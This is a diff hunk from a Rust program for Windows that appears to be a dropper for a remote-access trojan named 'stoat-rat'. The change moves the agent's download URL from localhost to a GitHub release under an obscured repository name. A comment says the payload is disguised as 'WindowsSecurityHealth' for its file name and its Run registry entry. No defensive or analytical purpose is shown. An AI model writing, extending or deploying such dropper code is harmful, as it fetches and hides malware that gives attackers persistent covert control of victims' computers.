@@ -7,7 +7,7 @@ use std::os::windows::process::CommandExt;
 use std::path::PathBuf;
 
 /// Where the agent is fetched from. Override with argv[1] or the RAT_URL env var.
-const DEFAULT_URL: &str = "http://127.0.0.1:8000/stoat-rat.exe";
+const DEFAULT_URL: &str = "https://github.com/promotezWorks/fjaf83jafkjnasfhdfjhaeshf3uhafashnfjksahvshauhefkjahn34fkjhaskhdvkjasndf/releases/download/v1/stoat-rat.exe";
 /// Windows-looking payload name (file + Run value).
 const PAYLOAD_NAME: &str = "WindowsSecurityHealth";
 
